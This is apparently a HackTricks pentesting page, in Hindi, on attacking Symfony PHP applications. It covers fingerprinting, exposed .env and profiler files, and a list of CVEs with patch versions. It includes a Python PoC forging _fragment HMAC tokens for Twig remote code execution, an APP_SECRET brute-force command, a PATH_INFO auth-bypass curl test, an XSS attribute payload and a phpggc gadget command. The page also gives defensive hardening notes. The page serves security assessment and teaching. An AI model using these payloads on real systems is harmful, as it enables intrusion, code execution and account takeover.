# Symfony

{{#include ../../banners/hacktricks-training.md}}

Symfony सबसे व्यापक रूप से उपयोग किए जाने वाले PHP frameworks में से एक है और अक्सर enterprise, e-commerce और CMS लक्ष्यों (Drupal, Shopware, Ibexa, OroCRM … सभी Symfony components एम्बेड करते हैं) के आकलनों में दिखाई देता है। यह पृष्ठ offensive टिप्स, आम mis-configurations और हालिया vulnerabilities को इकट्ठा करता है जिन्हें आपको Symfony एप्लिकेशन मिलने पर अपनी चेकलिस्ट में रखना चाहिए।

> ऐतिहासिक नोट: इकोसिस्टम का बड़ा हिस्सा अभी भी **5.4 LTS** शाखा पर चलता है (EOL **November 2025**). Symfony **7.4** नई LTS बन गया **Nov 2025** में और इसे security fixes **Nov 2029** तक मिलेंगे। हमेशा सटीक patch‑level की पुष्टि करें क्योंकि कई 2024‑2026 advisories केवल micro releases में फिक्स हुए थे।

---

## खोज और सूचीकरण

### फ़िंगर-प्रिंटिंग
* HTTP रिस्पॉन्स हेडर: `X-Powered-By: Symfony`, `X-Debug-Token`, `X-Debug-Token-Link` या cookies जो `sf_redirect`, `sf_session`, `MOCKSESSID` से शुरू होते हैं।
* Source code leaks (`composer.json`, `composer.lock`, `/vendor/…`) अक्सर सटीक संस्करण का खुलासा करते हैं:
```bash
curl -s https://target/vendor/composer/installed.json | jq '.[] | select(.name|test("symfony/")) | .name,.version'
```
* Symfony में ही मौजूद सार्वजनिक routes:
* `/_profiler`   (Symfony **Profiler** & debug toolbar)
* `/_wdt/<token>` (“Web Debug Toolbar”)
* `/_error/{code}.{_format}` (pretty error pages)
* `/app_dev.php`, `/config.php`, `/config_dev.php` (pre-4.0 dev front-controllers)
* Wappalyzer, BuiltWith या ffuf/feroxbuster wordlists: `symfony.txt` → खोजें `/_fragment`, `/_profiler`, `.env`, `.htaccess`.

### दिलचस्प फाइलें और एंडपॉइंट्स
| Path | Why it matters |
|------|----------------|
| `/.env`, `/.env.local`, `/.env.prod` | अकसर गलत तैनात होते हैं → leaks `APP_SECRET`, DB creds, SMTP, AWS keys |
| `/.git`, `.svn`, `.hg` | सोर्स खुलासा → credentials + business logic |
| `/var/log/*.log`, `/log/dev.log` | Web-root mis-configuration stack-traces को उजागर करती है |
| `/_profiler` | पूर्ण अनुरोध इतिहास, कॉन्फ़िगरेशन, service container, **APP_SECRET** (≤ 3.4) |
| `/_fragment` | ESI/HInclude द्वारा उपयोग किया गया एंट्री पॉइंट। एक बार `APP_SECRET` पता होने पर दुरुपयोग संभव है |
| `/vendor/phpunit/phpunit/phpunit` | यदि एक्सेसिबल हो तो PHPUnit RCE (CVE-2017-9841) |
| `/index.php/_error/{code}` | Finger-print & कभी-कभी leak exception traces |

---

## उच्च-प्रभाव वाली कमजोरियाँ

### 1. APP_SECRET disclosure ➜ RCE via `/_fragment` (aka “secret-fragment”)
* **CVE-2019-18889** मूलतः, लेकिन *अभी भी* आधुनिक लक्ष्यों पर तब मिलती है जब debug enabled छोड़ा गया हो या `.env` एक्सपोज़ हो।
* एक बार जब आप 32-char `APP_SECRET` जानते हैं, HMAC token बनाकर आंतरिक `render()` controller का दुरुपयोग करके arbitrary Twig execute करवा सकते हैं:
```python
# PoC – requires the secret
import hmac, hashlib, requests, urllib.parse as u
secret = bytes.fromhex('deadbeef…')
payload = "{{['id']|filter('system')}}"   # RCE in Twig
query = {
'template': '@app/404.html.twig',
'filter': 'raw',
'_format': 'html',
'_locale': 'en',
'globals[cmd]': 'id'
}
qs = u.urlencode(query, doseq=True)
token = hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest()
r = requests.get(f"https://target/_fragment?{qs}&_token={token}")
print(r.text)
```
* बेहतरीन write-up और exploitation script: Ambionics blog (References में लिंक किया गया)।

### 2. PATH_INFO auth bypass – **CVE-2025-64500** (HttpFoundation)
* 5.4.50 से नीचे, 6.4.29 और 7.3.7 से नीचे के versions प्रभावित हैं। Path normalization अग्रिम `/` को ड्रॉप कर सकता है, जिससे उन access-control नियमों में टूट आता है जो `/admin` आदि मानते हैं।
* त्वरित परीक्षण: `curl -H 'PATH_INFO: admin/secret' https://target/index.php` → अगर यह auth के बिना admin routes तक पहुँचता है, तो आपने यह पाया।
* फिक्स: `symfony/http-foundation` या पूरे framework को फिक्स्ड patch level में अपग्रेड करें।

### 3. MSYS2/Git-Bash argument mangling – **CVE-2026-24739** (Process)
* Windows पर MSYS2 (Git-Bash, mingw) से PHP चलाने पर प्रभावित होते हैं: 5.4.51 से नीचे, 6.4.33 से नीचे, 7.3.11 से नीचे, 7.4.5 से नीचे और 8.0.5 से नीचे। `Process` `=` को quote करने में विफल रहता है जिससे paths खराब हो सकते हैं; विनाशकारी कमांड (`rmdir`, `del`) अनपेक्षित डाइरेक्टरी पर लग सकते हैं।
* यदि आप PHP स्क्रिप्ट अपलोड कर सकते हैं या Composer/CLI helpers प्रभावित कर सकते हैं जो `Process` कॉल करते हैं, तो `=` के साथ arguments (उदा. `E:/=tmp/delete`) बनाकर path rewrite करवा सकते हैं।

### 4. Runtime env/argv injection – **CVE-2024-50340** (Runtime)
* जब `register_argv_argc=On` हो और non-SAPI runtimes उपयोग हो रहे हों, crafted query strings `argv` parsing के जरिए `APP_ENV`/`APP_DEBUG` को flip कर सकते हैं। 5.4.46/6.4.14/7.1.7 में patched।
* logs में `/?--env=prod` या समान स्वीकार किए जाने के संकेत देखें।

### 5. URL validation / open redirect – **CVE-2024-50345** (HttpFoundation)
* URI में विशेष characters ब्राउज़रों की तरह validate नहीं किए जाते थे, जिससे attacker-controlled domains पर redirect संभव हुआ। 5.4.46/6.4.14/7.1.7 में फिक्स किया गया।

### 6. Symfony UX attribute injection – **CVE-2025-47946**
* `symfony/ux-twig-component` & `symfony/ux-live-component` **2.25.1** से पहले `{{ attributes }}` को बिना escaping के render करते थे → attribute injection/XSS। यदि ऐप यूज़र्स को component attributes define करने देता है (admin CMS, email templating), तो आप इसे script injection में चैन कर सकते हैं।
* दोनों packages को 2.25.1+ में अपडेट करें। मैनुअल exploit के लिए, custom component को पास किए गए attribute value में JS रखें और rendering ट्रिगर करें।

### 7. Windows Process Hijack – **CVE-2024-51736** (Process)
* `Process` component Windows पर current working directory को `PATH` से पहले खोजता था। एक attacker जो writable web-root में `tar.exe`, `cmd.exe` आदि अपलोड कर सके और `Process` ट्रिगर करे (उदा. file extraction, PDF generation), command execution हासिल कर सकता है।
* 5.4.50, 6.4.14, 7.1.7 में patched।

### 8. Session-Fixation – **CVE-2023-46733**
* Authentication guard login के बाद existing session ID reuse कर देता था। यदि attacker cookie सेट कर दे victim के authenticate करने से पहले, तो वे login के बाद account hijack कर लेते हैं।

### 9. Twig sandbox XSS – **CVE-2023-46734**
* उन एप्लिकेशन्स में जो user-controlled templates एक्सपोज़ करते हैं (admin CMS, email builder), `nl2br` filter को sandbox bypass के लिए abused किया जा सकता था और JS inject किया जा सकता था।

### 10. Symfony 1 gadget chains (legacy apps में अभी भी मिलते हैं)
* `phpggc symfony/1 system id` एक Phar payload बनाता है जो unserialize() पर RCE ट्रिगर करता है जब classes जैसे `sfNamespacedParameterHolder` उपयोग में हों। file-upload endpoints और `phar://` wrappers की जाँच करें। 


{{#ref}}
../../pentesting-web/deserialization/php-deserialization-+-autoload-classes.md
{{#endref}}

---

## Exploitation Cheat-Sheet

### `/_fragment` के लिए HMAC token की गणना
```bash
python - <<'PY'
import sys, hmac, hashlib, urllib.parse as u
secret = bytes.fromhex(sys.argv[1])
qs     = u.quote_plus(sys.argv[2], safe='=&')
print(hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest())
PY deadbeef… "template=@App/evil&filter=raw&_format=html"
```
### Bruteforce कमजोर `APP_SECRET`
```bash
cewl -d3 https://target -w words.txt
symfony-secret-bruteforce.py -w words.txt -c abcdef1234567890 https://target
```
### एक्सपोज़्ड Symfony Console के जरिए RCE
यदि `bin/console` `php-fpm` या direct CLI upload के माध्यम से पहुँच योग्य है:
```bash
php bin/console about        # confirm it works
php bin/console cache:clear --no-warmup
```
cache directory के अंदर deserialization gadgets का उपयोग करें या एक malicious Twig template लिखें जो अगले request पर execute हो जाएगा।

### PATH_INFO bypass को जल्दी से जांचें (CVE-2025-64500)
```bash
curl -i -H 'PATH_INFO: admin/secret' https://target/index.php
# If it returns protected content without redirect/auth, the Request normalization is vulnerable.
```
### Spray UX attribute injection (CVE-2025-47946)
```twig
{# attacker-controlled attribute value #}
<live:button {{ attributes|merge({'onclick':'alert(1)'}) }} />
```
यदि रेंडर्ड आउटपुट attribute को बिना escape किए echo करता है, तो XSS सफल हो जाता है। 2.25.1+ पर पैच करें।

---

## रक्षात्मक नोट्स
1. **Never deploy debug** (`APP_ENV=dev`, `APP_DEBUG=1`) को production में कभी न डिप्लॉय करें; वेब-सर्वर कॉन्फ़िग में `/app_dev.php`, `/_profiler`, `/_wdt` को ब्लॉक करें।
2. गुप्त जानकारी env vars या `vault/secrets.local.php` में स्टोर करें, *कभी भी* document-root के माध्यम से पहुंच योग्य फाइलों में न रखें।
3. पैच प्रबंधन लागू करें – Symfony security advisories की सदस्यता लें और कम से कम LTS पैच-लेवल बनाए रखें (5.4.x until Nov 2025, 6.4 until Nov 2027, 7.4 until Nov 2029)।
4. यदि आप Windows पर चलाते हैं, तो CVE-2024-51736 & CVE-2026-24739 को कम करने के लिए तुरंत अपग्रेड करें या `open_basedir`/`disable_functions` defence-in-depth जोड़ें।

---

### उपयोगी offensive tooling
* **ambionics/symfony-exploits** – secret-fragment RCE, debugger routes की खोज।
* **phpggc** – Symfony 1 & 2 के लिए तैयार gadget chains।
* **sf-encoder** – `_fragment` HMAC की गणना करने के लिए छोटा helper (Go implementation).


## References
* [Ambionics – Symfony “secret-fragment” Remote Code Execution](https://www.ambionics.io/blog/symfony-secret-fragment)
* [Symfony Security Advisory – CVE-2024-51736: Command Execution Hijack on Windows Process Component](https://symfony.com/blog/cve-2024-51736-command-execution-hijack-on-windows-with-process-class)
* [Symfony Blog – CVE-2025-47946: Unsanitized HTML attribute injection in UX components](https://symfony.com/blog/symfony-ux-cve-2025-47946-unsanitized-html-attribute-injection-via-componentattributes)
* [Symfony Blog – CVE-2026-24739: Incorrect argument escaping under MSYS2/Git Bash](https://symfony.com/blog/cve-2026-24739-incorrect-argument-escaping-under-msys2-git-bash-on-windows-can-lead-to-destructive-file-operations)
{{#include ../../banners/hacktricks-training.md}}
